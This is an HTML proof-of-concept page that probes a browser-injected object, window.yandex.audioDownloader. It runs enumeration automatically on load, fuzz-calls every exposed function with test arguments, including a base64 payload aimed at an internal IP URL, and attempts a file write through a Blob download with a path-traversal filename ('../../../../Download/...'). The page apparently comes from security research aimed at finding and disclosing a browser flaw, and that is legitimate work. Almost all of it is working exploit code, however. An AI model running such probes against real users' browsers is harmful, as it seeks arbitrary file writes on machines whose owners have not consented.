<!doctype html><html><head><meta charset="utf-8"/><title>Yandex audioDownloader probe</title><style>body{font-family:monospace}button{font-size:18px;margin:6px;padding:10px}</style></head><body>
<h1>audioDownloader forensic PoC</h1>
<p>Goal: strictly detect <code>window.yandex.audioDownloader</code>, enumerate, then attempt safe write/corrupt-like calls if any methods exist.</p>
<pre id="out">Loading...</pre>
<button id="btn1">1) Strict enumerate audioDownloader</button>
<button id="btn2">2) Fuzz call functions (safe)</button>
<button id="btn3">3) Download/corrupt attempt (Blob + filename traversal)</button>
<script>
function log(s){const o=document.getElementById("out");o.textContent+=s+"\n";console.log(s)}
function safe(v){try{return String(v)}catch(e){return"[toString err] "+e}}
function ownKeys(o){try{return Reflect.ownKeys(o)}catch(e){return["[Reflect.ownKeys err] "+e]}}
function desc(o,k){try{const d=Object.getOwnPropertyDescriptor(o,k);return d?JSON.stringify({has:!0,enumerable:d.enumerable,configurable:d.configurable,writable:!!d.writable,hasGet:!!d.get,hasSet:!!d.set}):"null"}catch(e){return"[desc err] "+e}}
function tryGet(o,k){try{return{ok:!0,val:o[k]}}catch(e){return{ok:!1,err:e}}}
window.addEventListener("error",e=>log("[window.onerror] "+e.message));
function strictEnum(){
document.getElementById("out").textContent="";
log("UA="+navigator.userAgent);
log("location="+location.href);
log("typeof window.yandex="+typeof window.yandex+" "+safe(window.yandex));
if(!window.yandex){log("NO window.yandex");return}
log("ownKeys(window.yandex)="+JSON.stringify(ownKeys(window.yandex).slice(0,120)));
log("desc(window.yandex,\"audioDownloader\")="+desc(window.yandex,"audioDownloader"));
const r=tryGet(window.yandex,"audioDownloader");
if(!r.ok){log("GET audioDownloader threw: "+r.err);return}
log("typeof yandex.audioDownloader="+typeof r.val+" "+safe(r.val));
if(r.val){
log("ownKeys(audioDownloader)="+JSON.stringify(ownKeys(r.val).slice(0,200)));
for(const k of["save","download","start","write","setFile","setPath","saveBase64ToImageFile","saveBase64","saveToFile","enqueue","open","init","getVersion","version","isEnabled","enabled"]){
let rr=tryGet(r.val,k);
log("  member "+k+": "+(rr.ok?(typeof rr.val+" "+safe(rr.val)):"<throws> "+rr.err))
}}
}
async function fuzzSafe(){
document.getElementById("out").textContent="";
log("Fuzzing audioDownloader function properties (no large payloads)");
if(!window.yandex){log("NO window.yandex");return}
const r=tryGet(window.yandex,"audioDownloader");
if(!r.ok||!r.val){log("audioDownloader missing/throws");return}
const ad=r.val;
const keys=ownKeys(ad);
log("keys="+JSON.stringify(keys.slice(0,200)));
for(const k of keys){
let v;try{v=ad[k]}catch(e){log("GET "+k+" threw "+e);continue}
if(typeof v==="function"){
log("CALL "+k+"(...)");
try{
let res;
try{res=v.call(ad)}catch(e1){res="err0:"+e1}
log("  res0="+safe(res));
try{res=v.call(ad,"test")}catch(e2){res="err1:"+e2}
log("  res1="+safe(res));
try{res=v.call(ad,"dGVzdA==","https://10.11.3.2:445/poc.txt","attachment; filename=\"poc.txt\"","text/plain")}catch(e3){res="err4:"+e3}
log("  res4="+safe(res))
}catch(e){log("  call threw "+e)}
}}
}
function downloadAttempt(){
document.getElementById("out").textContent="";
log("Download/corrupt attempt: Blob + download attribute with traversal-ish filename");
const content="DJINI_FILE_WRITE_TEST\nTS="+Date.now()+"\n";
const blob=new Blob([content],{type:"text/plain"});
const url=URL.createObjectURL(blob);
const a=document.createElement("a");
const fname="../../../../Download/djini_traversal.txt";
a.href=url;a.download=fname;a.textContent="Download "+fname;
document.body.appendChild(a);
try{a.click();log("a.click() executed")}catch(e){log("a.click error "+e)}
log("If blocked, user must click the link above.")
}
document.getElementById("btn1").onclick=strictEnum;
document.getElementById("btn2").onclick=fuzzSafe;
document.getElementById("btn3").onclick=downloadAttempt;
setTimeout(()=>{document.getElementById("out").textContent="";log("Auto-run strictEnum in 1s...")},50);
setTimeout(strictEnum,1e3);
</script></body></html>
